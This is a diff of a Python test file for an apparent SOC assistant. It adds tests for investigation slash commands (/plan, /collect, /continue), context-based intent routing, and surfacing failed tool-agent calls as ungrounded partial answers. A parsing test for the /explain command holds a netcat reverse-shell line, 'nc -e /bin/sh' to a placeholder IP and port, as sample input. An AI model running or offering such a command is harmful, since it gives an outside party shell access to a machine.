@@ -18,7 +18,7 @@ from app.soc_assistant.router import AssistantIntentRouter
 from app.soc_assistant.schemas import AssistantCommandName, AssistantIntent
 from app.soc_assistant.schemas import QuestionAnswer
 from app.soc_assistant.service import SOCAssistant
-from app.soc_assistant.tool_agent import build_tools
+from app.soc_assistant.tool_agent import SOCToolAgentAnswer, build_tools
 from app.db.repositories.alert_memory import InMemoryAlertMemoryRepository
 from app.db.repositories.reports import InMemoryReportRepository
 
@@ -223,11 +223,52 @@ def test_slash_commands_are_strict_and_typed():
     assert question.arguments["question"] == "how should I contain this alert?"
     explained = router.parse_slash("/explain nc -e /bin/sh 192.0.2.10 4444")
     assert explained.command == AssistantCommandName.EXPLAIN
+    assert router.parse_slash("/plan INV-TEST").arguments == {
+        "investigation_id": "INV-TEST"
+    }
+    assert router.parse_slash("/collect INV-TEST").command == (
+        AssistantCommandName.COLLECT
+    )
+    assert router.parse_slash("/continue INV-TEST").command == (
+        AssistantCommandName.CONTINUE
+    )
     assert explained.arguments["command"] == "nc -e /bin/sh 192.0.2.10 4444"
     with pytest.raises(ValueError, match="Unsupported option"):
         router.parse_slash("/alerts --write yes")
     with pytest.raises(ValueError, match="Unknown command"):
         router.parse_slash("/shell")
+
+
+def test_recent_investigation_turns_ambiguous_follow_up_into_status():
+    intent = SOCAssistant._apply_recent_context(
+        AssistantIntent(
+            command=AssistantCommandName.CHAT,
+            arguments={"question": "what happened now?"},
+        ),
+        message="what happened now?",
+        recent_context={"investigation": "INV-RECENT"},
+    )
+
+    assert intent.command == AssistantCommandName.STATUS
+    assert intent.arguments == {"investigation_id": "INV-RECENT"}
+
+    collect = SOCAssistant._apply_recent_context(
+        AssistantIntent(command=AssistantCommandName.CHAT),
+        message="collect more evidence",
+        recent_context={"investigation": "INV-RECENT"},
+    )
+    assert collect.command == AssistantCommandName.COLLECT
+    assert collect.arguments == {"investigation_id": "INV-RECENT"}
+
+
+def test_general_what_happened_question_is_not_forced_to_status():
+    intent = SOCAssistant._apply_recent_context(
+        AssistantIntent(command=AssistantCommandName.CHAT),
+        message="what happened on server 001 yesterday?",
+        recent_context={"investigation": "INV-RECENT"},
+    )
+
+    assert intent.command == AssistantCommandName.CHAT
 
 
 @pytest.mark.parametrize(
@@ -744,6 +785,55 @@ def test_investigate_returns_existing_active_investigation(monkeypatch):
     assert investigations.started == []
 
 
+def test_controlled_commands_use_the_existing_investigation(monkeypatch):
+    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
+
+    class ControlledInvestigations(FakeInvestigations):
+        def snapshot(self, investigation_id, *, organization_id):
+            return {
+                "investigation_id": investigation_id,
+                "alert_id": "alert-1",
+                "agent_id": "001",
+                "status": "escalated",
+                "current_stage": "analyze",
+                "pending_nodes": [],
+                "diagnosis": {"needs_more_evidence": True},
+                "remediation_plan": None,
+                "advisory_plan": None,
+            }
+
+        def collect_more_evidence(self, investigation_id, *, organization_id):
+            value = self.snapshot(
+                investigation_id,
+                organization_id=organization_id,
+            )
+            value.update({"status": "running", "current_stage": "monitor"})
+            return value
+
+        def continue_investigation(self, investigation_id, *, organization_id):
+            return self.collect_more_evidence(
+                investigation_id,
+                organization_id=organization_id,
+            )
+
+    service = SOCAssistant(
+        gateway=FakeGateway(),
+        investigations=ControlledInvestigations(),
+        router=AssistantIntentRouter(llm=FailingLLM()),
+        tool_agent=UnavailableToolAgent(),
+    )
+
+    plan = respond(service, "/plan INV-TEST")
+    collected = respond(service, "/collect INV-TEST")
+    continued = respond(service, "/continue INV-TEST")
+
+    assert plan.response["plan_available"] is False
+    assert plan.response["grounded"] is True
+    assert collected.active_investigation_id == "INV-TEST"
+    assert collected.response["current_stage"] == "monitor"
+    assert continued.active_investigation_id == "INV-TEST"
+
+
 def test_non_durable_alerts_never_claim_a_new_since_cursor(monkeypatch):
     memory = InMemoryAlertMemoryRepository()
     monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
@@ -896,7 +986,7 @@ def test_help_and_health_are_available_without_llm(monkeypatch):
     service, _, _ = assistant()
 
     help_response = respond(service, "/help")
-    assert len(help_response.response["commands"]) == 10
+    assert len(help_response.response["commands"]) == 13
     assert help_response.tools_used == []
 
     health = respond(service, "/health")
@@ -986,6 +1076,31 @@ def test_tool_agent_answers_with_live_tool_calls(monkeypatch):
         for activity in response.activities
     )
     assert "3 failed SSH logins" in response.assistant_message
+
+
+def test_tool_agent_failure_is_machine_visible_in_chat_payload(monkeypatch):
+    class PartiallyFailingToolAgent:
+        def answer(self, **kwargs):
+            return SOCToolAgentAnswer(
+                answer="The alert search failed, so live scope is unverified.",
+                tool_calls=["search_alerts"],
+                failed_tools=["search_alerts"],
+            )
+
+    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
+    service = SOCAssistant(
+        gateway=FakeGateway(),
+        investigations=FakeInvestigations(),
+        router=AssistantIntentRouter(llm=FailingLLM()),
+        question_agent=FakeQuestionAgent(),
+        tool_agent=PartiallyFailingToolAgent(),
+    )
+
+    response = respond(service, "show suspicious activity")
+
+    assert response.response["answer_type"] == "soc_tool_agent_partial"
+    assert response.response["grounded"] is False
+    assert response.response["failed_tools"] == ["search_alerts"]
 
 
 def test_chat_answer_that_surfaces_an_alert_updates_active_alert_id(monkeypatch):
